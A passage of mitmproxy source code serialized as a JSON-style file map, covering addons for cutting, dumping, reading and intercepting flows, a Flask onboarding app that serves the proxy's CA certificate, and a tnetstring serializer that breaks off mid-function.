rex.search(context.client.sni))\n            for rex in hosts\n        )\n\n\ndef _starts_like_quic(data_client: bytes) -> bool:\n    # FIXME: handle clienthellos distributed over multiple packets?\n    # FIXME: perf\n    try:\n        quic_parse_client_hello(data_client)\n    except ValueError:\n        return False\n    else:\n        return True\n", "mitmproxy/addons/cut.py": "import csv\nimport io\nimport logging\nimport os.path\nfrom collections.abc import Sequence\nfrom typing import Any\n\nimport pyperclip\n\nimport mitmproxy.types\nfrom mitmproxy import certs\nfrom mitmproxy import command\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy.log import ALERT\n\nlogger = logging.getLogger(__name__)\n\n\ndef headername(spec: str):\n    if not (spec.startswith(\"header[\") and spec.endswith(\"]\")):\n        raise exceptions.CommandError(\"Invalid header spec: %s\" % spec)\n    return spec[len(\"header[\") : -1].strip()\n\n\ndef is_addr(v):\n    return isinstance(v, tuple) and len(v) > 1\n\n\ndef extract(cut: str, f: flow.Flow) -> str | bytes:\n    # Hack for https://github.com/mitmproxy/mitmproxy/issues/6721:\n    # Make \"save body\" keybind work for WebSocket flows.\n    # Ideally the keybind would be smarter and this here can get removed.\n    if (\n        isinstance(f, http.HTTPFlow)\n        and f.websocket\n        and cut in (\"request.content\", \"response.content\")\n    ):\n        return f.websocket._get_formatted_messages()\n\n    path = cut.split(\".\")\n    current: Any = f\n    for i, spec in enumerate(path):\n        if spec.startswith(\"_\"):\n            raise exceptions.CommandError(\"Can't access internal attribute %s\" % spec)\n\n        part = getattr(current, spec, None)\n        if i == len(path) - 1:\n            if spec == \"port\" and is_addr(current):\n                return str(current[1])\n            if spec == \"host\" and is_addr(current):\n                return str(current[0])\n            elif spec.startswith(\"header[\"):\n                if not current:\n                    return \"\"\n                return current.headers.get(headername(spec), \"\")\n            elif isinstance(part, bytes):\n                return part\n            elif isinstance(part, bool):\n                return \"true\" if part else \"false\"\n            elif isinstance(part, certs.Cert):  # pragma: no cover\n                return part.to_pem().decode(\"ascii\")\n            elif (\n                isinstance(part, list)\n                and len(part) > 0\n                and isinstance(part[0], certs.Cert)\n            ):\n                # TODO: currently this extracts only the very first cert as PEM-encoded string.\n                return part[0].to_pem().decode(\"ascii\")\n        current = part\n    return str(current or \"\")\n\n\ndef extract_str(cut: str, f: flow.Flow) -> str:\n    ret = extract(cut, f)\n    if isinstance(ret, bytes):\n        return repr(ret)\n    else:\n        return ret\n\n\nclass Cut:\n    @command.command(\"cut\")\n    def cut(\n        self,\n        flows: Sequence[flow.Flow],\n        cuts: mitmproxy.types.CutSpec,\n    ) -> mitmproxy.types.Data:\n        \"\"\"\n        Cut data from a set of flows. Cut specifications are attribute paths\n        from the base of the flow object, with a few conveniences - \"port\"\n        and \"host\" retrieve parts of an address tuple, \".header[key]\"\n        retrieves a header value. Return values converted to strings or\n        bytes: SSL certificates are converted to PEM format, bools are \"true\"\n        or \"false\", \"bytes\" are preserved, and all other values are\n        converted to strings.\n        \"\"\"\n        ret: list[list[str | bytes]] = []\n        for f in flows:\n            ret.append([extract(c, f) for c in cuts])\n        return ret  # type: ignore\n\n    @command.command(\"cut.save\")\n    def save(\n        self,\n        flows: Sequence[flow.Flow],\n        cuts: mitmproxy.types.CutSpec,\n        path: mitmproxy.types.Path,\n    ) -> None:\n        \"\"\"\n        Save cuts to file. If there are multiple flows or cuts, the format\n        is UTF-8 encoded CSV. If there is exactly one row and one column,\n        the data is written to file as-is, with raw bytes preserved. If the\n        path is prefixed with a \"+\", values are appended if there is an\n        existing file.\n        \"\"\"\n        append = False\n        if path.startswith(\"+\"):\n            append = True\n            epath = os.path.expanduser(path[1:])\n            path = mitmproxy.types.Path(epath)\n        try:\n            if len(cuts) == 1 and len(flows) == 1:\n                with open(path, \"ab\" if append else \"wb\") as fp:\n                    if fp.tell() > 0:\n                        # We're appending to a file that already exists and has content\n                        fp.write(b\"\\n\")\n                    v = extract(cuts[0], flows[0])\n                    if isinstance(v, bytes):\n                        fp.write(v)\n                    else:\n                        fp.write(v.encode(\"utf8\"))\n                logger.log(ALERT, \"Saved single cut.\")\n            else:\n                with open(\n                    path, \"a\" if append else \"w\", newline=\"\", encoding=\"utf8\"\n                ) as tfp:\n                    writer = csv.writer(tfp)\n                    for f in flows:\n                        vals = [extract_str(c, f) for c in cuts]\n                        writer.writerow(vals)\n                logger.log(\n                    ALERT,\n                    \"Saved %s cuts over %d flows as CSV.\" % (len(cuts), len(flows)),\n                )\n        except OSError as e:\n            logger.error(str(e))\n\n    @command.command(\"cut.clip\")\n    def clip(\n        self,\n        flows: Sequence[flow.Flow],\n        cuts: mitmproxy.types.CutSpec,\n    ) -> None:\n        \"\"\"\n        Send cuts to the clipboard. If there are multiple flows or cuts, the\n        format is UTF-8 encoded CSV. If there is exactly one row and one\n        column, the data is written to file as-is, with raw bytes preserved.\n        \"\"\"\n        v: str | bytes\n        fp = io.StringIO(newline=\"\")\n        if len(cuts) == 1 and len(flows) == 1:\n            v = extract_str(cuts[0], flows[0])\n            fp.write(v)\n            logger.log(ALERT, \"Clipped single cut.\")\n        else:\n            writer = csv.writer(fp)\n            for f in flows:\n                vals = [extract_str(c, f) for c in cuts]\n                writer.writerow(vals)\n            logger.log(ALERT, \"Clipped %s cuts as CSV.\" % len(cuts))\n        try:\n            pyperclip.copy(fp.getvalue())\n        except pyperclip.PyperclipException as e:\n            logger.error(str(e))\n", "mitmproxy/addons/comment.py": "from collections.abc import Sequence\n\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import flow\nfrom mitmproxy.hooks import UpdateHook\n\n\nclass Comment:\n    @command.command(\"flow.comment\")\n    def comment(self, flow: Sequence[flow.Flow], comment: str) -> None:\n        \"Add a comment to a flow\"\n\n        updated = []\n        for f in flow:\n            f.comment = comment\n            updated.append(f)\n\n        ctx.master.addons.trigger(UpdateHook(updated))\n", "mitmproxy/addons/dumper.py": "from __future__ import annotations\n\nimport itertools\nimport logging\nimport shutil\nimport sys\nfrom typing import IO\nfrom typing import Optional\n\nfrom wsproto.frame_protocol import CloseReason\n\nfrom mitmproxy import contentviews\nfrom mitmproxy import ctx\nfrom mitmproxy import dns\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy.contrib import click as miniclick\nfrom mitmproxy.net.dns import response_codes\nfrom mitmproxy.options import CONTENT_VIEW_LINES_CUTOFF\nfrom mitmproxy.tcp import TCPFlow\nfrom mitmproxy.tcp import TCPMessage\nfrom mitmproxy.udp import UDPFlow\nfrom mitmproxy.udp import UDPMessage\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils import strutils\nfrom mitmproxy.utils import vt_codes\nfrom mitmproxy.websocket import WebSocketData\nfrom mitmproxy.websocket import WebSocketMessage\n\n\ndef indent(n: int, text: str) -> str:\n    lines = str(text).strip().splitlines()\n    pad = \" \" * n\n    return \"\\n\".join(pad + i for i in lines)\n\n\nCONTENTVIEW_STYLES: dict[str, dict[str, str | bool]] = {\n    \"highlight\": dict(bold=True),\n    \"offset\": dict(fg=\"blue\"),\n    \"header\": dict(fg=\"green\", bold=True),\n    \"text\": dict(fg=\"green\"),\n}\n\n\nclass Dumper:\n    def __init__(self, outfile: IO[str] | None = None):\n        self.filter: flowfilter.TFilter | None = None\n        self.outfp: IO[str] = outfile or sys.stdout\n        self.out_has_vt_codes = vt_codes.ensure_supported(self.outfp)\n\n    def load(self, loader):\n        loader.add_option(\n            \"flow_detail\",\n            int,\n            1,\n            f\"\"\"\n            The display detail level for flows in mitmdump: 0 (quiet) to 4 (very verbose).\n              0: no output\n              1: shortened request URL with response status code\n              2: full request URL with response status code and HTTP headers\n              3: 2 + truncated response content, content of WebSocket and TCP messages (content_view_lines_cutoff: {CONTENT_VIEW_LINES_CUTOFF})\n              4: 3 + nothing is truncated\n            \"\"\",\n        )\n        loader.add_option(\n            \"dumper_default_contentview\",\n            str,\n            \"auto\",\n            \"The default content view mode.\",\n            choices=[i.name.lower() for i in contentviews.views],\n        )\n        loader.add_option(\n            \"dumper_filter\", Optional[str], None, \"Limit which flows are dumped.\"\n        )\n\n    def configure(self, updated):\n        if \"dumper_filter\" in updated:\n            if ctx.options.dumper_filter:\n                try:\n                    self.filter = flowfilter.parse(ctx.options.dumper_filter)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            else:\n                self.filter = None\n\n    def style(self, text: str, **style) -> str:\n        if style and self.out_has_vt_codes:\n            text = miniclick.style(text, **style)\n        return text\n\n    def echo(self, text: str, ident=None, **style):\n        if ident:\n            text = indent(ident, text)\n        text = self.style(text, **style)\n        print(text, file=self.outfp)\n\n    def _echo_headers(self, headers: http.Headers):\n        for k, v in headers.fields:\n            ks = strutils.bytes_to_escaped_str(k)\n            ks = self.style(ks, fg=\"blue\")\n            vs = strutils.bytes_to_escaped_str(v)\n            self.echo(f\"{ks}: {vs}\", ident=4)\n\n    def _echo_trailers(self, trailers: http.Headers | None):\n        if not trailers:\n            return\n        self.echo(\"--- HTTP Trailers\", fg=\"magenta\", ident=4)\n        self._echo_headers(trailers)\n\n    def _colorful(self, line):\n        yield \"    \"  # we can already indent here\n        for style, text in line:\n            yield self.style(text, **CONTENTVIEW_STYLES.get(style, {}))\n\n    def _echo_message(\n        self,\n        message: http.Message | TCPMessage | UDPMessage | WebSocketMessage,\n        flow: http.HTTPFlow | TCPFlow | UDPFlow,\n    ):\n        _, lines, error = contentviews.get_message_content_view(\n            ctx.options.dumper_default_contentview, message, flow\n        )\n        if error:\n            logging.debug(error)\n\n        if ctx.options.flow_detail == 3:\n            lines_to_echo = itertools.islice(\n                lines, ctx.options.content_view_lines_cutoff\n            )\n        else:\n            lines_to_echo = lines\n\n        content = \"\\r\\n\".join(\"\".join(self._colorful(line)) for line in lines_to_echo)\n        if content:\n            self.echo(\"\")\n            self.echo(content)\n\n        if next(lines, None):\n            self.echo(\"(cut off)\", ident=4, dim=True)\n\n        if ctx.options.flow_detail >= 2:\n            self.echo(\"\")\n\n    def _fmt_client(self, flow: flow.Flow) -> str:\n        if flow.is_replay == \"request\":\n            return self.style(\"[replay]\", fg=\"yellow\", bold=True)\n        elif flow.client_conn.peername:\n            return self.style(\n                strutils.escape_control_characters(\n                    human.format_address(flow.client_conn.peername)\n                )\n            )\n        else:  # pragma: no cover\n            # this should not happen, but we're defensive here.\n            return \"\"\n\n    def _echo_request_line(self, flow: http.HTTPFlow) -> None:\n        client = self._fmt_client(flow)\n\n        pushed = \" PUSH_PROMISE\" if \"h2-pushed-stream\" in flow.metadata else \"\"\n        method = flow.request.method + pushed\n        method_color = dict(GET=\"green\", DELETE=\"red\").get(method.upper(), \"magenta\")\n        method = self.style(\n            strutils.escape_control_characters(method), fg=method_color, bold=True\n        )\n        if ctx.options.showhost:\n            url = flow.request.pretty_url\n        else:\n            url = flow.request.url\n\n        if ctx.options.flow_detail == 1:\n            # We need to truncate before applying styles, so we just focus on the URL.\n            terminal_width_limit = max(shutil.get_terminal_size()[0] - 25, 50)\n            if len(url) > terminal_width_limit:\n                url = url[:terminal_width_limit] + \"\u2026\"\n        url = self.style(strutils.escape_control_characters(url), bold=True)\n\n        http_version = \"\"\n        if not (\n            flow.request.is_http10 or flow.request.is_http11\n        ) or flow.request.http_version != getattr(\n            flow.response, \"http_version\", \"HTTP/1.1\"\n        ):\n            # Hide version for h1 <-> h1 connections.\n            http_version = \" \" + flow.request.http_version\n\n        self.echo(f\"{client}: {method} {url}{http_version}\")\n\n    def _echo_response_line(self, flow: http.HTTPFlow) -> None:\n        if flow.is_replay == \"response\":\n            replay_str = \"[replay]\"\n            replay = self.style(replay_str, fg=\"yellow\", bold=True)\n        else:\n            replay_str = \"\"\n            replay = \"\"\n\n        assert flow.response\n        code_int = flow.response.status_code\n        code_color = None\n        if 200 <= code_int < 300:\n            code_color = \"green\"\n        elif 300 <= code_int < 400:\n            code_color = \"magenta\"\n        elif 400 <= code_int < 600:\n            code_color = \"red\"\n        code = self.style(\n            str(code_int),\n            fg=code_color,\n            bold=True,\n            blink=(code_int == 418),\n        )\n\n        if not (flow.response.is_http2 or flow.response.is_http3):\n            reason = flow.response.reason\n        else:\n            reason = http.status_codes.RESPONSES.get(flow.response.status_code, \"\")\n        reason = self.style(\n            strutils.escape_control_characters(reason), fg=code_color, bold=True\n        )\n\n        if flow.response.raw_content is None:\n            size = \"(content missing)\"\n        else:\n            size = human.pretty_size(len(flow.response.raw_content))\n        size = self.style(size, bold=True)\n\n        http_version = \"\"\n        if (\n            not (flow.response.is_http10 or flow.response.is_http11)\n            or flow.request.http_version != flow.response.http_version\n        ):\n            # Hide version for h1 <-> h1 connections.\n            http_version = f\"{flow.response.http_version} \"\n\n        arrows = self.style(\" <<\", bold=True)\n        if ctx.options.flow_detail == 1:\n            # This aligns the HTTP response code with the HTTP request method:\n            # 127.0.0.1:59519: GET http://example.com/\n            #               << 304 Not Modified 0b\n            pad = max(\n                0,\n                len(human.format_address(flow.client_conn.peername))\n                - (2 + len(http_version) + len(replay_str)),\n            )\n            arrows = \" \" * pad + arrows\n\n        self.echo(f\"{replay}{arrows} {http_version}{code} {reason} {size}\")\n\n    def echo_flow(self, f: http.HTTPFlow) -> None:\n        if f.request:\n            self._echo_request_line(f)\n            if ctx.options.flow_detail >= 2:\n                self._echo_headers(f.request.headers)\n            if ctx.options.flow_detail >= 3:\n                self._echo_message(f.request, f)\n            if ctx.options.flow_detail >= 2:\n                self._echo_trailers(f.request.trailers)\n\n        if f.response:\n            self._echo_response_line(f)\n            if ctx.options.flow_detail >= 2:\n                self._echo_headers(f.response.headers)\n            if ctx.options.flow_detail >= 3:\n                self._echo_message(f.response, f)\n            if ctx.options.flow_detail >= 2:\n                self._echo_trailers(f.response.trailers)\n\n        if f.error:\n            msg = strutils.escape_control_characters(f.error.msg)\n            self.echo(f\" << {msg}\", bold=True, fg=\"red\")\n\n        self.outfp.flush()\n\n    def match(self, f):\n        if ctx.options.flow_detail == 0:\n            return False\n        if not self.filter:\n            return True\n        elif flowfilter.match(self.filter, f):\n            return True\n        return False\n\n    def response(self, f):\n        if self.match(f):\n            self.echo_flow(f)\n\n    def error(self, f):\n        if self.match(f):\n            self.echo_flow(f)\n\n    def websocket_message(self, f: http.HTTPFlow):\n        assert f.websocket is not None  # satisfy type checker\n        if self.match(f):\n            message = f.websocket.messages[-1]\n\n            direction = \"->\" if message.from_client else \"<-\"\n            self.echo(\n                f\"{human.format_address(f.client_conn.peername)} \"\n                f\"{direction} WebSocket {message.type.name.lower()} message \"\n                f\"{direction} {human.format_address(f.server_conn.address)}{f.request.path}\"\n            )\n            if ctx.options.flow_detail >= 3:\n                self._echo_message(message, f)\n\n    def websocket_end(self, f: http.HTTPFlow):\n        assert f.websocket is not None  # satisfy type checker\n        if self.match(f):\n            if f.websocket.close_code in {1000, 1001, 1005}:\n                c = \"client\" if f.websocket.closed_by_client else \"server\"\n                self.echo(\n                    f\"WebSocket connection closed by {c}: {f.websocket.close_code} {f.websocket.close_reason}\"\n                )\n            else:\n                error = flow.Error(\n                    f\"WebSocket Error: {self.format_websocket_error(f.websocket)}\"\n                )\n                self.echo(\n                    f\"Error in WebSocket connection to {human.format_address(f.server_conn.address)}: {error}\",\n                    fg=\"red\",\n                )\n\n    def format_websocket_error(self, websocket: WebSocketData) -> str:\n        try:\n            ret = CloseReason(websocket.close_code).name  # type: ignore\n        except ValueError:\n            ret = f\"UNKNOWN_ERROR={websocket.close_code}\"\n        if websocket.close_reason:\n            ret += f\" (reason: {websocket.close_reason})\"\n        return ret\n\n    def _proto_error(self, f):\n        if self.match(f):\n            self.echo(\n                f\"Error in {f.type.upper()} connection to {human.format_address(f.server_conn.address)}: {f.error}\",\n                fg=\"red\",\n            )\n\n    def tcp_error(self, f):\n        self._proto_error(f)\n\n    def udp_error(self, f):\n        self._proto_error(f)\n\n    def _proto_message(self, f: TCPFlow | UDPFlow) -> None:\n        if self.match(f):\n            message = f.messages[-1]\n            direction = \"->\" if message.from_client else \"<-\"\n            if f.client_conn.tls_version == \"QUIC\":\n                if f.type == \"tcp\":\n                    quic_type = \"stream\"\n                else:\n                    quic_type = \"dgrams\"\n                # TODO: This should not be metadata, this should be typed attributes.\n                flow_type = (\n                    f\"quic {quic_type} {f.metadata.get('quic_stream_id_client','')} \"\n                    f\"{direction} mitmproxy {direction} \"\n                    f\"quic {quic_type} {f.metadata.get('quic_stream_id_server','')}\"\n                )\n            else:\n                flow_type = f.type\n            self.echo(\n                \"{client} {direction} {type} {direction} {server}\".format(\n                    client=human.format_address(f.client_conn.peername),\n                    server=human.format_address(f.server_conn.address),\n                    direction=direction,\n                    type=flow_type,\n                )\n            )\n            if ctx.options.flow_detail >= 3:\n                self._echo_message(message, f)\n\n    def tcp_message(self, f):\n        self._proto_message(f)\n\n    def udp_message(self, f):\n        self._proto_message(f)\n\n    def _echo_dns_query(self, f: dns.DNSFlow) -> None:\n        client = self._fmt_client(f)\n        opcode = dns.op_codes.to_str(f.request.op_code)\n        type = dns.types.to_str(f.request.questions[0].type)\n\n        desc = f\"DNS {opcode} ({type})\"\n        desc_color = {\n            \"A\": \"green\",\n            \"AAAA\": \"magenta\",\n        }.get(type, \"red\")\n        desc = self.style(desc, fg=desc_color)\n\n        name = self.style(f.request.questions[0].name, bold=True)\n        self.echo(f\"{client}: {desc} {name}\")\n\n    def dns_response(self, f: dns.DNSFlow):\n        assert f.response\n        if self.match(f):\n            self._echo_dns_query(f)\n\n            arrows = self.style(\" <<\", bold=True)\n            if f.response.answers:\n                answers = \", \".join(\n                    self.style(str(x), fg=\"bright_blue\") for x in f.response.answers\n                )\n            else:\n                answers = self.style(\n                    response_codes.to_str(\n                        f.response.response_code,\n                    ),\n                    fg=\"red\",\n                )\n            self.echo(f\"{arrows} {answers}\")\n\n    def dns_error(self, f: dns.DNSFlow):\n        assert f.error\n        if self.match(f):\n            self._echo_dns_query(f)\n            msg = strutils.escape_control_characters(f.error.msg)\n            self.echo(f\" << {msg}\", bold=True, fg=\"red\")\n", "mitmproxy/addons/readfile.py": "import asyncio\nimport logging\nimport os.path\nimport sys\nfrom typing import BinaryIO\nfrom typing import Optional\n\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import io\n\nlogger = logging.getLogger(__name__)\n\n\nclass ReadFile:\n    \"\"\"\n    An addon that handles reading from file on startup.\n    \"\"\"\n\n    def __init__(self):\n        self.filter = None\n        self._read_task: asyncio.Task | None = None\n\n    def load(self, loader):\n        loader.add_option(\"rfile\", Optional[str], None, \"Read flows from file.\")\n        loader.add_option(\n            \"readfile_filter\", Optional[str], None, \"Read only matching flows.\"\n        )\n\n    def configure(self, updated):\n        if \"readfile_filter\" in updated:\n            if ctx.options.readfile_filter:\n                try:\n                    self.filter = flowfilter.parse(ctx.options.readfile_filter)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            else:\n                self.filter = None\n\n    async def load_flows(self, fo: BinaryIO) -> int:\n        cnt = 0\n        freader = io.FlowReader(fo)\n        try:\n            for flow in freader.stream():\n                if self.filter and not self.filter(flow):\n                    continue\n                await ctx.master.load_flow(flow)\n                cnt += 1\n        except (OSError, exceptions.FlowReadException) as e:\n            if cnt:\n                logging.warning(\"Flow file corrupted - loaded %i flows.\" % cnt)\n            else:\n                logging.error(\"Flow file corrupted.\")\n            raise exceptions.FlowReadException(str(e)) from e\n        else:\n            return cnt\n\n    async def load_flows_from_path(self, path: str) -> int:\n        path = os.path.expanduser(path)\n        try:\n            with open(path, \"rb\") as f:\n                return await self.load_flows(f)\n        except OSError as e:\n            logging.error(f\"Cannot load flows: {e}\")\n            raise exceptions.FlowReadException(str(e)) from e\n\n    async def doread(self, rfile: str) -> None:\n        try:\n            await self.load_flows_from_path(rfile)\n        except exceptions.FlowReadException as e:\n            logger.exception(f\"Failed to read {ctx.options.rfile}: {e}\")\n\n    def running(self):\n        if ctx.options.rfile:\n            self._read_task = asyncio.create_task(self.doread(ctx.options.rfile))\n\n    @command.command(\"readfile.reading\")\n    def reading(self) -> bool:\n        return bool(self._read_task and not self._read_task.done())\n\n\nclass ReadFileStdin(ReadFile):\n    \"\"\"Support the special case of \"-\" for reading from stdin\"\"\"\n\n    async def load_flows_from_path(self, path: str) -> int:\n        if path == \"-\":  # pragma: no cover\n            # Need to think about how to test this. This function is scheduled\n            # onto the event loop, where a sys.stdin mock has no effect.\n            return await self.load_flows(sys.stdin.buffer)\n        else:\n            return await super().load_flows_from_path(path)\n", "mitmproxy/addons/intercept.py": "from typing import Optional\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\n\n\nclass Intercept:\n    filt: flowfilter.TFilter | None = None\n\n    def load(self, loader):\n        loader.add_option(\"intercept_active\", bool, False, \"Intercept toggle\")\n        loader.add_option(\n            \"intercept\", Optional[str], None, \"Intercept filter expression.\"\n        )\n\n    def configure(self, updated):\n        if \"intercept\" in updated:\n            if ctx.options.intercept:\n                try:\n                    self.filt = flowfilter.parse(ctx.options.intercept)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n                ctx.options.intercept_active = True\n            else:\n                self.filt = None\n                ctx.options.intercept_active = False\n\n    def should_intercept(self, f: flow.Flow) -> bool:\n        return bool(\n            ctx.options.intercept_active\n            and self.filt\n            and self.filt(f)\n            and not f.is_replay\n        )\n\n    def process_flow(self, f: flow.Flow) -> None:\n        if self.should_intercept(f):\n            f.intercept()\n\n    # Handlers\n\n    def request(self, f):\n        self.process_flow(f)\n\n    def response(self, f):\n        self.process_flow(f)\n\n    def tcp_message(self, f):\n        self.process_flow(f)\n\n    def udp_message(self, f):\n        self.process_flow(f)\n\n    def dns_request(self, f):\n        self.process_flow(f)\n\n    def dns_response(self, f):\n        self.process_flow(f)\n\n    def websocket_message(self, f):\n        self.process_flow(f)\n", "mitmproxy/addons/onboardingapp/__init__.py": "import os\n\nfrom flask import Flask\nfrom flask import render_template\n\nfrom mitmproxy.options import CONF_BASENAME\nfrom mitmproxy.options import CONF_DIR\nfrom mitmproxy.utils.magisk import write_magisk_module\n\napp = Flask(__name__)\n# will be overridden in the addon, setting this here so that the Flask app can be run standalone.\napp.config[\"CONFDIR\"] = CONF_DIR\n\n\n@app.route(\"/\")\ndef index():\n    return render_template(\"index.html\")\n\n\n@app.route(\"/cert/pem\")\ndef pem():\n    return read_cert(\"pem\", \"application/x-x509-ca-cert\")\n\n\n@app.route(\"/cert/p12\")\ndef p12():\n    return read_cert(\"p12\", \"application/x-pkcs12\")\n\n\n@app.route(\"/cert/cer\")\ndef cer():\n    return read_cert(\"cer\", \"application/x-x509-ca-cert\")\n\n\n@app.route(\"/cert/magisk\")\ndef magisk():\n    filename = CONF_BASENAME + f\"-magisk-module.zip\"\n    p = os.path.join(app.config[\"CONFDIR\"], filename)\n    p = os.path.expanduser(p)\n\n    if not os.path.exists(p):\n        write_magisk_module(p)\n\n    with open(p, \"rb\") as f:\n        cert = f.read()\n\n    return cert, {\n        \"Content-Type\": \"application/zip\",\n        \"Content-Disposition\": f\"attachment; filename={filename}\",\n    }\n\n\ndef read_cert(ext, content_type):\n    filename = CONF_BASENAME + f\"-ca-cert.{ext}\"\n    p = os.path.join(app.config[\"CONFDIR\"], filename)\n    p = os.path.expanduser(p)\n    with open(p, \"rb\") as f:\n        cert = f.read()\n\n    return cert, {\n        \"Content-Type\": content_type,\n        \"Content-Disposition\": f\"attachment; filename={filename}\",\n    }\n", "mitmproxy/io/tnetstring.py": "\"\"\"\ntnetstring:  data serialization using typed netstrings\n======================================================\n\nThis is a custom Python 3 implementation of tnetstrings.\nCompared to other implementations, the main difference\nis that this implementation supports a custom unicode datatype.\n\nAn ordinary tnetstring is a blob of data prefixed with its length and postfixed\nwith its type. Here are some examples:\n\n    >>> tnetstring.dumps(\"hello world\")\n    11:hello world,\n    >>> tnetstring.dumps(12345)\n    5:12345#\n    >>> tnetstring.dumps([12345, True, 0])\n    19:5:12345#4:true!1:0#]\n\nThis module gives you the following functions:\n\n    :dump:    dump an object as a tnetstring to a file\n    :dumps:   dump an object as a tnetstring to a string\n    :load:    load a tnetstring-encoded object from a file\n    :loads:   load a tnetstring-encoded object from a string\n\nNote that since parsing a tnetstring requires reading all the data into memory\nat once, there's no efficiency gain from using the file-based versions of these\nfunctions.  They're only here so you can use load() to read precisely one\nitem from a file or socket without consuming any extra data.\n\nThe tnetstrings specification explicitly states that strings are binary blobs\nand forbids the use of unicode at the protocol level.\n**This implementation decodes dictionary keys as surrogate-escaped ASCII**,\nall other strings are returned as plain bytes.\n\n:Copyright: (c) 2012-2013 by Ryan Kelly <ryan@rfk.id.au>.\n:Copyright: (c) 2014 by Carlo Pires <carlopires@gmail.com>.\n:Copyright: (c) 2016 by Maximilian Hils <tnetstring3@maximilianhils.com>.\n\n:License: MIT\n\"\"\"\n\nimport collections\nfrom typing import BinaryIO\nfrom typing import Union\n\nTSerializable = Union[None, str, bool, int, float, bytes, list, tuple, dict]\n\n\ndef dumps(value: TSerializable) -> bytes:\n    \"\"\"\n    This function dumps a python object as a tnetstring.\n    \"\"\"\n    #  This uses a deque to collect output fragments in reverse order,\n    #  then joins them together at the end.  It's measurably faster\n    #  than creating all the intermediate strings.\n    q: collections.deque = collections.deque()\n    _rdumpq(q, 0, value)\n    return b\"\".join(q)\n\n\ndef dump(value: TSerializable, file_handle: BinaryIO) -> None:\n    \"\"\"\n    This function dumps a python object as a tnetstring and\n    writes it to the given file.\n    \"\"\"\n    file_handle.write(dumps(value))\n\n\ndef _rdumpq(q: collections.deque, size: int, value: TSerializable) -> int:\n    \"\"\"\n    Dump value as a tnetstring, to a deque instance, last chunks first.\n\n    This function generates the tnetstring representation of the given value,\n    pushing chunks of the output onto the given deque instance.  It pushes\n    the last chunk first, then recursively generates more chunks.\n\n    When passed in the current size of the string in the queue, it will return\n    the new size of the string in the queue.\n\n    Operating last-chunk-first makes it easy to calculate the size written\n    for recursive structures without having to build their representation as\n    a string.  This is measurably faster than generating the intermediate\n    strings, especially on deeply nested structures.\n    \"\"\"\n    write = q.appendleft\n    if value is None:\n        write(b\"0:~\")\n        return size + 3\n    elif value is True:\n        write(b\"4:true!\")\n        return size + 7\n    elif value is False:\n        write(b\"5:false!\")\n        return size + 8\n    elif isinstance(value, int):\n        data = str(value).encode()\n        ldata = len(data)\n        span = str(ldata).encode()\n        write(b\"%s:%s#\" % (span, data))\n        return size + 2 + len(span) + ldata\n    elif isinstance(value, float):\n        #  Use repr() for float rather than str().\n        #  It round-trips more accurately.\n        #  Probably unnecessary in later python versions that\n        #  use David Gay's ftoa routines.\n        data = repr(value).encode()\n        ldata = len(data)\n        span = str(ldata).encode()\n        write(b\"%s:%s^\" % (span, data))\n        return size + 2 + len(span) + ldata\n    elif isinstance(value, bytes):\n        data = value\n        ldata = len(data)\n        span = str(ldata).encode()\n        write(b\",\")\n        write(data)\n        write(b\":\")\n        write(span)\n        return size + 2 + len(span) + ldata\n    elif isinstance(value, str):\n        data = value.encode(\"utf8\")\n        ldata = len(data)\n        span = str(ldata).encode()\n        write(b\";\")\n        write(data)\n        write(b\":\")\n        write(span)\n        return size + 2 + len(span) + ldata\n    elif isinstance(value, (list, tuple)):\n        write(b\"]\")\n        init_size = size = size + 1\n        for item in reversed(value):\n            size = _rdumpq(q, size, item)\n        span = str(size - init_size).encode()\n        write(b\":\")\n        write(span)\n        return size + 1 + len(span)\n    elif isinstance(value, dict):\n        write(b\"}\")\n        init_size = size = size + 1\n        for k, v in value.items():\n            size = _rdumpq(q, size, v)\n            size = _rdumpq(q, size, k)\n        span = str(size - init_size).encode()\n        write(b\":\")\n        write(span)\n        return size + 1 + len(span)\n    else:\n        raise ValueError(f\"unserializable object: {value} ({type(value)})\")\n\n\ndef loads(string: bytes) -> TSerializable:\n    \"\"\"\n    This function parses a tnetstring into a python object.\n    \"\"\"\n    return pop(string)[0]\n\n\ndef load(file_handle: BinaryIO) -> TSerializable:\n    \"\"\"load(file) -> object\n\n    This function reads a tnetstring from a file and parses it into a\n    python object.  The file must support the read() method, and this\n    function promises not to read more data than necessary.\n    \"\"\"\n    #  Read the length prefix one char at a time.\n    #  Note that the netstring spec explicitly forbids padding zeros.\n    c = file_handle.read(1)\n    if c == b\"\":  # we want to detect this special case.\n        raise ValueError(\"not a tnetstring: empty file\")\n    data_length = b\"\"\n    while c.isdigit():\n        data_length += c\n        if len(data_length) > 12:\n            raise ValueError(\"not a tnetstring: absurdly large length prefix\")\n        c = file_handle.read(1)\n    if c != b\":\":\n        raise ValueError(\"not a tnetstring: missing or invalid length prefix\")\n\n    data = file_handle.read(int(data_length))\n    data_type = file_handle.read(1)[0]\n\n    return parse(data_type, data)\n\n\ndef parse(data_type: int, data: bytes) -> TSerializable:\n    if data_type == ord(b\",\"):\n        return data\n    if data_type == ord(b\";\"):\n        return data.decode(\"utf8\")\n    if data_type == ord(b\"#\"):\n        try:\n            return int(data)\n        except ValueError:\n            raise ValueError(f\"not a tnetstring: invalid integer literal: {data!r}\")\n    if data_type == ord(b\"^\"):\n        try:\n            return float(data)\n        except ValueError:\n            raise ValueError(f\"not a tnetstring: invalid float literal: {data!r}\")\n    if data_type == ord(b\"!\"):\n        if data == b\"true\":\n            return True\n        elif data == b\"false\":\n            return False\n        else:\n            raise ValueError(f\"not a tnetstring: invalid boolean literal: {data!r}\")\n    if data_type == ord(b\"~\"):\n        if data:\n            raise ValueError(f\"not a tnetstring: invalid null literal: {data!r}\")\n        return None\n    if data_type == ord(b\"]\"):\n        lst = []\n        while data:\n            item, data = 